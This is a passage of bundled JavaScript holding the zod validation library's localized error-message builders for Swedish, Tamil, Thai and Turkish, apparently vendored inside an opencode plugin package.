    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datum och tid",
    date: "ISO-datum",
    time: "ISO-tid",
    duration: "ISO-varaktighet",
    ipv4: "IPv4-intervall",
    ipv6: "IPv6-intervall",
    cidrv4: "IPv4-spektrum",
    cidrv6: "IPv6-spektrum",
    base64: "base64-kodad str\xE4ng",
    base64url: "base64url-kodad str\xE4ng",
    json_string: "JSON-str\xE4ng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "mall-literal"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ogiltig inmatning: f\xF6rv\xE4ntat ${issue3.expected}, fick ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ogiltig inmatning: f\xF6rv\xE4ntat ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ogiltigt val: f\xF6rv\xE4ntade en av ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `F\xF6r stor(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element"}`;
        }
        return `F\xF6r stor(t): f\xF6rv\xE4ntat ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `F\xF6r lite(t): f\xF6rv\xE4ntade ${issue3.origin ?? "v\xE4rdet"} att ha ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Ogiltig str\xE4ng: m\xE5ste b\xF6rja med "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Ogiltig str\xE4ng: m\xE5ste sluta med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ogiltig str\xE4ng: m\xE5ste inneh\xE5lla "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ogiltig str\xE4ng: m\xE5ste matcha m\xF6nstret "${_issue.pattern}"`;
        return `Ogiltig(t) ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ogiltigt tal: m\xE5ste vara en multipel av ${issue3.divisor}`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Ok\xE4nda nycklar" : "Ok\xE4nd nyckel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ogiltig nyckel i ${issue3.origin ?? "v\xE4rdet"}`;
      case "invalid_union":
        return "Ogiltig input";
      case "invalid_element":
        return `Ogiltigt v\xE4rde i ${issue3.origin ?? "v\xE4rdet"}`;
      default:
        return `Ogiltig input`;
    }
  };
};
function sv_default2() {
  return {
    localeError: error82()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ta.js
var error83 = () => {
  const Sizable = {
    string: { unit: "\u0B8E\u0BB4\u0BC1\u0BA4\u0BCD\u0BA4\u0BC1\u0B95\u0BCD\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    file: { unit: "\u0BAA\u0BC8\u0B9F\u0BCD\u0B9F\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    array: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" },
    set: { unit: "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD", verb: "\u0B95\u0BCA\u0BA3\u0BCD\u0B9F\u0BBF\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u0B8E\u0BA3\u0BCD \u0B85\u0BB2\u0BCD\u0BB2\u0BBE\u0BA4\u0BA4\u0BC1" : "\u0B8E\u0BA3\u0BCD";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0B85\u0BA3\u0BBF";
        }
        if (data === null) {
          return "\u0BB5\u0BC6\u0BB1\u0BC1\u0BAE\u0BC8";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1",
    email: "\u0BAE\u0BBF\u0BA9\u0BCD\u0BA9\u0B9E\u0BCD\u0B9A\u0BB2\u0BCD \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0BA4\u0BC7\u0BA4\u0BBF \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    date: "ISO \u0BA4\u0BC7\u0BA4\u0BBF",
    time: "ISO \u0BA8\u0BC7\u0BB0\u0BAE\u0BCD",
    duration: "ISO \u0B95\u0BBE\u0BB2 \u0B85\u0BB3\u0BB5\u0BC1",
    ipv4: "IPv4 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    ipv6: "IPv6 \u0BAE\u0BC1\u0B95\u0BB5\u0BB0\u0BBF",
    cidrv4: "IPv4 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    cidrv6: "IPv6 \u0BB5\u0BB0\u0BAE\u0BCD\u0BAA\u0BC1",
    base64: "base64-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    base64url: "base64url-encoded \u0B9A\u0BB0\u0BAE\u0BCD",
    json_string: "JSON \u0B9A\u0BB0\u0BAE\u0BCD",
    e164: "E.164 \u0B8E\u0BA3\u0BCD",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.expected}, \u0BAA\u0BC6\u0BB1\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0BB0\u0BC1\u0BAA\u0BCD\u0BAA\u0BAE\u0BCD: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${joinValues2(issue3.values, "|")} \u0B87\u0BB2\u0BCD \u0B92\u0BA9\u0BCD\u0BB1\u0BC1`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0B89\u0BB1\u0BC1\u0BAA\u0BCD\u0BAA\u0BC1\u0B95\u0BB3\u0BCD"} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95 \u0BAA\u0BC6\u0BB0\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin ?? "\u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1"} ${adj}${issue3.maximum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        }
        return `\u0BAE\u0BBF\u0B95\u0B9A\u0BCD \u0B9A\u0BBF\u0BB1\u0BBF\u0BAF\u0BA4\u0BC1: \u0B8E\u0BA4\u0BBF\u0BB0\u0BCD\u0BAA\u0BBE\u0BB0\u0BCD\u0B95\u0BCD\u0B95\u0BAA\u0BCD\u0BAA\u0B9F\u0BCD\u0B9F\u0BA4\u0BC1 ${issue3.origin} ${adj}${issue3.minimum.toString()} \u0B86\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.prefix}" \u0B87\u0BB2\u0BCD \u0BA4\u0BCA\u0B9F\u0B99\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "ends_with")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.suffix}" \u0B87\u0BB2\u0BCD \u0BAE\u0BC1\u0B9F\u0BBF\u0BB5\u0B9F\u0BC8\u0BAF \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "includes")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.includes}" \u0B90 \u0B89\u0BB3\u0BCD\u0BB3\u0B9F\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "regex")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: ${_issue.pattern} \u0BAE\u0BC1\u0BB1\u0BC8\u0BAA\u0BBE\u0B9F\u0BCD\u0B9F\u0BC1\u0B9F\u0BA9\u0BCD \u0BAA\u0BCA\u0BB0\u0BC1\u0BA8\u0BCD\u0BA4 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B8E\u0BA3\u0BCD: ${issue3.divisor} \u0B87\u0BA9\u0BCD \u0BAA\u0BB2\u0BAE\u0BBE\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      case "unrecognized_keys":
        return `\u0B85\u0B9F\u0BC8\u0BAF\u0BBE\u0BB3\u0BAE\u0BCD \u0BA4\u0BC6\u0BB0\u0BBF\u0BAF\u0BBE\u0BA4 \u0BB5\u0BBF\u0B9A\u0BC8${issue3.keys.length > 1 ? "\u0B95\u0BB3\u0BCD" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0B9A\u0BC8`;
      case "invalid_union":
        return "\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1";
      case "invalid_element":
        return `${issue3.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1`;
      default:
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1`;
    }
  };
};
function ta_default2() {
  return {
    localeError: error83()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/th.js
var error84 = () => {
  const Sizable = {
    string: { unit: "\u0E15\u0E31\u0E27\u0E2D\u0E31\u0E01\u0E29\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    file: { unit: "\u0E44\u0E1A\u0E15\u0E4C", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    array: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    set: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u0E44\u0E21\u0E48\u0E43\u0E0A\u0E48\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02 (NaN)" : "\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0E2D\u0E32\u0E23\u0E4C\u0E40\u0E23\u0E22\u0E4C (Array)";
        }
        if (data === null) {
          return "\u0E44\u0E21\u0E48\u0E21\u0E35\u0E04\u0E48\u0E32 (null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19",
    email: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48\u0E2D\u0E35\u0E40\u0E21\u0E25",
    url: "URL",
    emoji: "\u0E2D\u0E34\u0E42\u0E21\u0E08\u0E34",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    date: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E41\u0E1A\u0E1A ISO",
    time: "\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    duration: "\u0E0A\u0E48\u0E27\u0E07\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    ipv4: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv4",
    ipv6: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv6",
    cidrv4: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv4",
    cidrv6: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv6",
    base64: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64",
    base64url: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64 \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A URL",
    json_string: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A JSON",
    e164: "\u0E40\u0E1A\u0E2D\u0E23\u0E4C\u0E42\u0E17\u0E23\u0E28\u0E31\u0E1E\u0E17\u0E4C\u0E23\u0E30\u0E2B\u0E27\u0E48\u0E32\u0E07\u0E1B\u0E23\u0E30\u0E40\u0E17\u0E28 (E.164)",
    jwt: "\u0E42\u0E17\u0E40\u0E04\u0E19 JWT",
    template_literal: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${issue3.expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0E04\u0E48\u0E32\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19\u0E2B\u0E19\u0E36\u0E48\u0E07\u0E43\u0E19 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u0E44\u0E21\u0E48\u0E40\u0E01\u0E34\u0E19" : "\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23"}`;
        return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u0E2D\u0E22\u0E48\u0E32\u0E07\u0E19\u0E49\u0E2D\u0E22" : "\u0E21\u0E32\u0E01\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue3.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E02\u0E36\u0E49\u0E19\u0E15\u0E49\u0E19\u0E14\u0E49\u0E27\u0E22 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E25\u0E07\u0E17\u0E49\u0E32\u0E22\u0E14\u0E49\u0E27\u0E22 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 "${_issue.includes}" \u0E2D\u0E22\u0E39\u0E48\u0E43\u0E19\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21`;
        if (_issue.format === "regex")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14 ${_issue.pattern}`;
        return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E40\u0E1B\u0E47\u0E19\u0E08\u0E33\u0E19\u0E27\u0E19\u0E17\u0E35\u0E48\u0E2B\u0E32\u0E23\u0E14\u0E49\u0E27\u0E22 ${issue3.divisor} \u0E44\u0E14\u0E49\u0E25\u0E07\u0E15\u0E31\u0E27`;
      case "unrecognized_keys":
        return `\u0E1E\u0E1A\u0E04\u0E35\u0E22\u0E4C\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E23\u0E39\u0E49\u0E08\u0E31\u0E01: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0E04\u0E35\u0E22\u0E4C\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue3.origin}`;
      case "invalid_union":
        return "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E44\u0E21\u0E48\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E22\u0E39\u0E40\u0E19\u0E35\u0E22\u0E19\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14\u0E44\u0E27\u0E49";
      case "invalid_element":
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue3.origin}`;
      default:
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07`;
    }
  };
};
function th_default2() {
  return {
    localeError: error84()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/tr.js
var parsedType7 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "number";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error85 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "olmal\u0131" },
    file: { unit: "bayt", verb: "olmal\u0131" },
    array: { unit: "\xF6\u011Fe", verb: "olmal\u0131" },
    set: { unit: "\xF6\u011Fe", verb: "olmal\u0131" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "girdi",
    email: "e-posta adresi",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO tarih ve saat",
    date: "ISO tarih",
    time: "ISO saat",
    duration: "ISO s\xFCre",
    ipv4: "IPv4 adresi",
    ipv6: "IPv6 adresi",
    cidrv4: "IPv4 aral\u0131\u011F\u0131",
    cidrv6: "IPv6 aral\u0131\u011F\u0131",
    base64: "base64 ile \u015Fifrelenmi\u015F metin",
    base64url: "base64url ile \u015Fifrelenmi\u015F metin",
    json_string: "JSON dizesi",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "\u015Eablon dizesi"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ge\xE7ersiz de\u011Fer: beklenen ${issue3.expected}, al\u0131nan ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ge\xE7ersiz de\u011Fer: beklenen ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ge\xE7ersiz se\xE7enek: a\u015Fa\u011F\u0131dakilerden biri olmal\u0131: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ok b\xFCy\xFCk: beklenen ${issue3.origin ?? "de\u011Fer"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\xF6\u011Fe"}`;
        return `\xC7ok b\xFCy\xFCk: beklenen ${issue3.origin ?? "de\u011Fer"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ge\xE7ersiz metin: "${_issue.prefix}" ile ba\u015Flamal\u0131`;
        if (_issue.format === "ends_with")
          return `Ge\xE7ersiz metin: "${_issue.suffix}" ile bitmeli`;
        if (_issue.format === "includes")
          return `Ge\xE7ersiz metin: "${_issue.includes}" i\xE7ermeli`;
        if (_issue.format === "regex")
          return `Ge\xE7ersiz metin: ${_issue.pattern} desenine uymal\u0131`;
